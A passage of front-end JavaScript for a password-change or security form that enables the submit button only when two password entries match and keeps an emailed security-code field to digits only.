    const submitButton = document.getElementById('password-ok');

    if (passwordOne === passwordTwo && passwordOne !== "") {
        submitButton.disabled = false;
    } else {
        submitButton.disabled = true;
    }
}

document.getElementById('password-ok').disabled = true;

document.addEventListener('DOMContentLoaded', function () {
    const inputField = document.getElementById('security-email-code-input-text');

    inputField.value = '';

    inputField.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '');
    });
});